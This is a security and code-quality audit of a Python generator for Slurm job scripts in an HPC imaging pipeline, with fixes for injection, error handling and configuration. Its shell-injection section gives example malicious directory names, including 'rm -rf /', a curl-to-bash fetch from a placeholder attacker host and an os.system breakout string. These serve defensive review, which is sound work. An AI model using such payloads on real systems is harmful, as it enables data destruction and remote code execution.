# Audit & Improvement Blueprint
## `create_codex_slurm_submission_V048.py`

**Audit Date:** 2026-04-13  
**Script Version:** 48 (Dynamic Marker Name Resolution)  
**Scope:** Read-only security, structural, and logic review  
**Target Environment:** Slurm HPC, GPFS, MCMICRO + Singularity

---

## 1. Security & Vulnerability Report

**Priority: P0 | Risk Level: Critical**

### 1.1 Shell Injection — Generated Bash Scripts

> [!CAUTION]
> The script injects unsanitized filesystem-derived strings directly into shell command strings. A malicious or accidental directory name containing shell metacharacters results in **arbitrary command execution** under the user's Slurm allocation.

#### Vector A: Ashlar `for` loop — [L316](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L316)

```python
# L316 — dirs contains filesystem directory names
f"for dir in {' '.join(dirs)}; do"
```

The `dirs` list is built from `prospective_dirs` (L115), which concatenates raw base names with cycle indices. If a directory name is `Core; rm -rf /` or `$(curl attacker.com/payload.sh|bash)`, it executes verbatim inside the bash `for` loop.

**Attack surface:** Any user with write access to the source data directory can create a subdirectory with a crafted name. When the script runs under Slurm, the injected command runs with the submitting user's credentials on a compute node.

**Fix architecture:** Shell-quote every element in the `dirs` list using `shlex.quote()`:

```python
import shlex

quoted_dirs = ' '.join(shlex.quote(d) for d in dirs)
# Then:
f"for dir in {quoted_dirs}; do"
```

#### Vector B: Slurm job body paths — [L445](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L445), [L446](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L446), [L447](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L447), [L449](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L449), [L451](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L451)

Every `{source_data_dir}`, `{scratch_run_dir}`, and `{staged_scripts_dir}` interpolation is unquoted inside bash. Since `source_data_dir` is directly from `args.data_dir` (L369), a path like `/data/my project (copy)` will break the `rsync` command. Metacharacters go further.

**Fix architecture:** Wrap all path interpolations in double quotes inside the generated bash:

```python
f'rsync -ah --info=progress2 "{source_data_dir}/" "{scratch_run_dir}/"'
```

Or centralize by writing paths as bash variables at the top of each script and quoting expansions:

```bash
SOURCE_DIR="/path/with spaces"
SCRATCH_DIR="/scratch/path"
rsync -ah --info=progress2 "${SOURCE_DIR}/" "${SCRATCH_DIR}/"
```

#### Vector C: Generated Python string literal — [L174](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L174)

```python
f'path = "{path}"'
```

If `path` contains a `"` character, the generated Python is:
```python
path = "/scratch/my"injected_code"
```
This is a syntax error at minimum, code injection at worst if crafted carefully.

**Fix architecture:** Use `repr()` for the path value:

```python
f'path = {repr(path)}'
```

#### Vector D: Dict injection — [L175](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L175)

```python
f'dirs_map = {dirs_to_rename_map}'
```

Dictionary keys are raw directory names. A directory named `': __import__('os').system('id'),'x` could break out of the dict literal context.

**Fix architecture:** Serialize via `json.dumps()` and deserialize in the generated script:

```python
import json
# In generator:
f'dirs_map = json.loads({repr(json.dumps(dirs_to_rename_map))})'
# In generated script header:
'import json'
```

---

### 1.2 Silent Failure Points

| Location | Pattern | Risk |
|---|---|---|
| [L179](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L179) | `except OSError: pass` on directory rename | Rename fails silently → Ashlar runs against old directory names → pipeline crash with opaque error |
| [L195](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L195) | `except OSError: pass` on file rename | Files retain original names → downstream pattern matching (`F{series}.ims`) fails silently |
| [L464–470](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L464-L470) | No `check=True` on `sbatch` calls | Failed sbatch returns empty string → `--dependency=afterok:` is malformed → cascade of silent sbatch errors |
| [L472–473](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L472-L473) | Single `except Exception as e: print(...)` around entire chain | Partial chain already submitted. No rollback, no indication of which job failed, no `scancel` of orphaned jobs |

---

## 2. Structural & Portability Improvements

**Priority: P1 | Effort: Medium**

### 2.1 Externalizing Hardcoded Paths

**Current state:** Three hardcoded paths at [L28–30](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L28-L30):

```python
SCRATCH_BASE_DIR = "/scratch/cciszews/nextflow_runs/"
CONDA_BASE_PATH = "/gpfs/data/hdid-share/conda"
QC_SCRIPTS_DIR = "/gpfs/data/hdid-share/Codex/HDID/scripts/current_working_scripts/"
```

**Proposed architecture:** Use a layered config resolution:

```
Priority 1: CLI args (--scratch-dir, --conda-base, etc.)
Priority 2: Environment variables (CODEX_SCRATCH_DIR, CODEX_CONDA_BASE, etc.)
Priority 3: Config file (~/.codex_pipeline.json or .env in data_dir)
Priority 4: Script defaults (current hardcoded values)
```

**Implementation pattern (no external deps):**

```python
import json

def load_config(cli_args):
    """Resolve configuration with cascading priority."""
    # Priority 4: defaults
    config = {
        "scratch_base_dir": "/scratch/cciszews/nextflow_runs/",
        "conda_base_path": "/gpfs/data/hdid-share/conda",
        "qc_scripts_dir": "/gpfs/data/hdid-share/Codex/HDID/scripts/current_working_scripts/",
    }

    # Priority 3: config file
    config_path = os.path.join(cli_args.data_dir, '.codex_pipeline.json')
    if os.path.exists(config_path):
        with open(config_path) as f:
            config.update(json.load(f))

    # Priority 2: environment variables
    env_map = {
        "CODEX_SCRATCH_DIR": "scratch_base_dir",
        "CODEX_CONDA_BASE": "conda_base_path",
        "CODEX_QC_SCRIPTS_DIR": "qc_scripts_dir",
    }
    for env_key, config_key in env_map.items():
        val = os.environ.get(env_key)
        if val:
            config[config_key] = val

    # Priority 1: CLI overrides
    if cli_args.scratch_dir:
        config["scratch_base_dir"] = cli_args.scratch_dir

    return config
```

This preserves backward compatibility (existing users change nothing), while allowing per-project or per-user overrides.

### 2.2 Robust Slurm Dependency Chain

**Current state:** A linear `afterok` chain where job N+1 depends on job N. If any job fails, all downstream jobs are never scheduled. But jobs already submitted to the queue remain orphaned.

**Problems with current implementation:**
1. No validation that `sbatch` returned a valid numeric job ID.
2. No `check=True` — a failed sbatch is silently ignored.
3. No rollback — if job 4 submission fails, jobs 1–3 are orphaned.
4. The `afterok` dependency means a job that fails with a non-zero exit code cancels all dependents. This is correct behavior. But there's no notification mechanism beyond checking Slurm logs.

**Proposed architecture:**

```python
import re

def submit_chain(slurm_paths):
    """Submit Slurm job chain with validation and rollback."""
    submitted_ids = []
    
    for job_key in ['1_staging', '2_renaming', '3_ashlar', '4_preprocess',
                     '5_segment', '6_quant_merge', '7_archive']:
        cmd = ["sbatch", "--parsable"]
        
        if submitted_ids:
            cmd.append(f"--dependency=afterok:{submitted_ids[-1]}")
        
        cmd.append(slurm_paths[job_key])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"FATAL: sbatch failed for {job_key}: {result.stderr.strip()}")
            # Rollback: cancel all previously submitted jobs
            if submitted_ids:
                scancel_cmd = ["scancel"] + submitted_ids
                subprocess.run(scancel_cmd)
                print(f"  Rolled back jobs: {', '.join(submitted_ids)}")
            sys.exit(1)
        
        job_id = result.stdout.strip()
        if not re.match(r'^\d+$', job_id):
            print(f"FATAL: sbatch returned non-numeric job ID for {job_key}: '{job_id}'")
            if submitted_ids:
                subprocess.run(["scancel"] + submitted_ids)
            sys.exit(1)
        
        submitted_ids.append(job_id)
        print(f"  Submitted {job_key}: Job ID {job_id}")
    
    return submitted_ids
```

**Key improvements:**
- Validates each job ID is numeric before using it in a dependency.
- Cancels all previously submitted jobs if any submission fails.
- Provides clear per-job feedback.

---

## 3. Functionality & Logic Refinement

**Priority: P2 | Effort: Low**

### 3.1 Revised `get_final_indices` Logic

**Current logic is correct**, but has two fragility gaps:

1. **Column name sensitivity** — `row.get('marker_name', '')` will silently return `''` if the CSV header is `Marker_Name`, `marker`, or `MarkerName`. The function will report "marker not found" when the real issue is header mismatch.

2. **No diagnostic output** — When a marker name isn't found in survivors, the caller gets `-1` or a short list but no visibility into what the surviving list actually contains.

**Revised logic (pseudocode):**

```
FUNCTION get_final_indices(markers_path, nuc_name, memb_names_list):

    READ CSV with DictReader
    
    # STEP 0: Header validation
    required_columns = {'marker_name', 'ashlar', 'remove'}
    actual_columns = set(reader.fieldnames)
    
    # Case-insensitive header matching
    column_map = {}
    FOR each required_col IN required_columns:
        match = find case-insensitive match in actual_columns
        IF no match FOUND:
            RAISE ConfigError(f"CSV missing required column '{required_col}'. Found: {actual_columns}")
        column_map[required_col] = match
    
    # STEP 1: Build surviving marker list
    surviving_markers = []
    FOR each row IN CSV:
        ashlar_val = normalize(row[column_map['ashlar']])
        remove_val = normalize(row[column_map['remove']])
        
        IF ashlar_val != 'skip' AND remove_val NOT IN {'true', 't', '1', 'yes'}:
            surviving_markers.APPEND(normalize(row[column_map['marker_name']]))
    
    # STEP 2: Resolve indices with diagnostics
    nuc_idx = lookup(nuc_name, surviving_markers)
    IF nuc_idx == NOT_FOUND:
        RAISE MarkerNotFoundError(
            f"Nuclear marker '{nuc_name}' not in surviving channels. "
            f"Survivors: {surviving_markers}"
        )
    
    memb_indices = []
    FOR name IN memb_names_list:
        idx = lookup(name, surviving_markers)
        IF idx == NOT_FOUND:
            RAISE MarkerNotFoundError(
                f"Membrane marker '{name}' not in surviving channels. "
                f"Survivors: {surviving_markers}"
            )
        memb_indices.APPEND(idx)
    
    RETURN nuc_idx, memb_indices
```

**Key changes:**
- Case-insensitive header matching prevents silent failures from CSV header variations.
- Explicit exceptions with the full surviving marker list enable immediate diagnosis.
- No return of `-1` sentinel — use exceptions for control flow.

### 3.2 Ashlar Wrapper CSV Parsing Resilience

**Current state** ([L250–280](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L250-L280)): The generated `ashlar_wrapper.py` uses `headers.index('cycle')`, `headers.index('ashlar')`, etc. If `markers_ashlar.csv` is malformed (BOM prefix, trailing whitespace in headers, missing column), this raises an unhandled `ValueError` deep inside an Ashlar Slurm job.

**Proposed improvements:**

```python
# Inside the generated ashlar_wrapper.py heredoc:

# 1. Strip BOM and whitespace from headers
headers = [h.strip().lstrip('\ufeff') for h in next(reader)]

# 2. Validated column lookup with clear error
def get_col_idx(headers, name):
    # Case-insensitive search
    name_lower = name.lower()
    for i, h in enumerate(headers):
        if h.lower() == name_lower:
            return i
    raise SystemExit(
        f"FATAL: Column '{name}' not found in markers_ashlar.csv. "
        f"Available columns: {headers}"
    )

cycle_idx = get_col_idx(headers, 'cycle')
ashlar_idx = get_col_idx(headers, 'ashlar')
channel_idx = get_col_idx(headers, 'channel')

# 3. Guard against empty/whitespace-only rows
for row in reader:
    if not row or all(cell.strip() == '' for cell in row):
        continue
```

### 3.3 Resource Estimation Edge Cases

**TMA scaling problem:** For a TMA with 500+ cores, segmentation time estimates exceed typical Slurm partition limits.

| Cores | Est. Seg Hours | Est. Quant Hours | Exceeds 7-day limit? |
|-------|---------------|-----------------|---------------------|
| 100   | 83h (3.5d)    | 63h (2.6d)      | No                  |
| 200   | 163h (6.8d)   | 123h (5.1d)     | No / Borderline     |
| 250   | 203h (8.5d)   | 153h (6.4d)     | **Yes** (seg)       |
| 500   | 403h (16.8d)  | 303h (12.6d)    | **Yes** (both)      |

**Proposed fix:** Clamp estimates to the partition's `MaxWallTime` and emit a warning:

```python
MAX_WALL_HOURS = 168  # 7 days — typical Slurm partition limit

if est_segmentation_hours > MAX_WALL_HOURS:
    print(f"WARNING: Estimated segmentation time ({est_segmentation_hours:.0f}h) "
          f"exceeds {MAX_WALL_HOURS}h partition limit. "
          f"Consider splitting into array jobs or reducing core count.")
    est_segmentation_hours = MAX_WALL_HOURS
```

For datasets exceeding the limit, the recommended architectural change is to convert the monolithic segmentation job into a **Slurm job array** (`#SBATCH --array=1-N`) where each array task processes a subset of TMA cores. This is natively supported by MCMICRO's `--from`/`--to` parameters and avoids the wall time constraint entirely.

---

## 4. Summary — Risk Matrix

| ID | Finding | Severity | Effort | Location |
|----|---------|----------|--------|----------|
| S1 | Shell injection in Ashlar `for` loop | **P0 Critical** | Low | [L316](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L316) |
| S2 | Unquoted path interpolation in Slurm scripts | **P0 High** | Low | L445–451 |
| S3 | Python code injection via f-string dict/path | **P0 High** | Low | [L174–175](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L174-L175) |
| S4 | Silent `OSError` swallowing in renamer | **P1 High** | Low | [L179](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L179), [L195](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L195) |
| S5 | No sbatch return validation / no rollback | **P1 High** | Medium | [L464–470](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L464-L470) |
| L1 | Case-sensitive CSV header matching | **P2 Medium** | Low | [L68–73](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L68-L73) |
| L2 | Ashlar wrapper unhandled `ValueError` on bad CSV | **P2 Medium** | Low | [L253](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L253) |
| R1 | TMA seg time exceeds partition wall limit at >200 cores | **P2 Medium** | Medium | [L137](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L137) |
| R2 | Static memory allocation regardless of data size | **P3 Low** | Medium | [L139–144](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L139-L144) |
| C1 | Hardcoded paths prevent multi-user deployment | **P1 Medium** | Medium | [L28–30](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L28-L30) |
| X1 | XML parsing with no structural validation | **P2 Medium** | Low | [L225–230](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L225-L230) |

---

## 5. One Positive Note

The `get_final_indices` logic at [L60–83](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L60-L83) is **mathematically correct**. The simultaneous filtering of `ashlar=skip` and `remove=TRUE` in a single pass produces identical results to sequential filtering because the two filters are independent (they test different columns on the same row). The 0-based → 1-based conversion at [L344–345](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L344-L345) for Recyze is also correct. The ashlar wrapper's parallel implementation at [L270](file:///c:/DATA/Antigravity/Workspaces/Work_repos/codex_HPC_job_submission/submission_scripts/create_codex_slurm_submission_V048.py#L270) correctly only filters `ashlar=skip` since Backsub hasn't run at that pipeline stage.
